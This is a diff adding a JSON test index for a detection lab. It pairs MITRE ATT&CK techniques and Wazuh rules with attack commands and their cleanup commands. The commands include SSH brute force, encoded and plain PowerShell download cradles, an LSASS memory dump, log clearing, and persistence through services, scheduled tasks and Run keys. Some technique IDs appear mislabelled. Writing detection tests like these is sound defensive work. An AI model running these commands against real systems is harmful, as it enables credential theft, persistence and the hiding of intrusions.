@@ -1,0 +1,95 @@
+{
+  "_comment": "Machine-readable attack test index for Tier 3 automated validation runner and Operator Console dispatch",
+  "detections": {
+    "DET-001": {
+      "technique": "T1110.001",
+      "name": "SSH Brute Force",
+      "target": "linux-victim",
+      "wazuh_rule": "100008",
+      "cmd": "for i in $(seq 1 8); do sshpass -p 'WrongPass123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 invaliduser@100.81.241.63 2>/dev/null || true; done",
+      "cleanup": "",
+      "doc": "attack-tests/t1110-001-ssh-bruteforce.md"
+    },
+    "DET-002": {
+      "technique": "T1059.001",
+      "name": "PowerShell Encoded Command Execution",
+      "target": "windows-victim",
+      "wazuh_rule": "100005",
+      "cmd": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AdABlAHMAdAAnACkA",
+      "cleanup": "",
+      "doc": "attack-tests/t1059-001-powershell-cradle.md"
+    },
+    "DET-003": {
+      "technique": "T1059.001",
+      "name": "Suspicious PowerShell Download Cradle",
+      "target": "windows-victim",
+      "wazuh_rule": "100004",
+      "cmd": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/test')\"",
+      "cleanup": "",
+      "doc": "attack-tests/t1059-001-powershell-cradle.md"
+    },
+    "DET-004": {
+      "technique": "T1003.001",
+      "name": "Windows Credential Dumping via LSASS Access",
+      "target": "windows-victim",
+      "wazuh_rule": "100003",
+      "cmd": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full",
+      "cleanup": "del C:\\Temp\\lsass.dmp /f /q 2>nul",
+      "doc": "attack-tests/t1003-001-lsass-dump.md"
+    },
+    "DET-005": {
+      "technique": "T1136.001",
+      "name": "New Local User Creation",
+      "target": "windows-victim",
+      "wazuh_rule": "100002",
+      "cmd": "net user lab_test_user P@ssw0rd123! /add",
+      "cleanup": "net user lab_test_user /delete",
+      "doc": "attack-tests/t1136-001-user-creation.md"
+    },
+    "DET-006": {
+      "technique": "T1053.005",
+      "name": "Scheduled Task Creation",
+      "target": "windows-victim",
+      "wazuh_rule": "100006",
+      "cmd": "schtasks /create /tn LabTest /tr calc.exe /sc onlogon",
+      "cleanup": "schtasks /delete /tn LabTest /f",
+      "doc": "attack-tests/t1053-005-scheduled-task.md"
+    },
+    "DET-007": {
+      "technique": "T1543.003",
+      "name": "Windows Service Creation by Suspicious Path",
+      "target": "windows-victim",
+      "wazuh_rule": "100011",
+      "cmd": "sc.exe create EvilService binPath= \"C:\\Temp\\evil.exe\"",
+      "cleanup": "sc.exe delete EvilService",
+      "doc": "attack-tests/t1543-003-service-creation.md"
+    },
+    "DET-011": {
+      "technique": "T1685.005",
+      "name": "Clearing Windows Security Event Log",
+      "target": "windows-victim",
+      "wazuh_rule": "100007",
+      "cmd": "wevtutil cl Security",
+      "cleanup": "",
+      "doc": "attack-tests/t1685-005-log-clearing.md"
+    },
+    "DET-012": {
+      "technique": "T1098",
+      "name": "Notepad Execution",
+      "target": "windows-victim",
+      "wazuh_rule": "100012",
+      "cmd": "start notepad.exe",
+      "cleanup": "taskkill /im notepad.exe /f 2>nul",
+      "doc": "docs/pipeline-demo/README.md"
+    },
+    "DET-013": {
+      "technique": "T1547.001",
+      "name": "Registry Run Key Persistence via SetValue",
+      "target": "windows-victim",
+      "wazuh_rule": "100021",
+      "cmd": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"LabPersistence\" /t REG_SZ /d \"C:\\Temp\\beacon.exe\" /f",
+      "cleanup": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"LabPersistence\" /f",
+      "doc": "attack-tests/t1547-001-registry-run-key.md"
+    }
+  }
+}
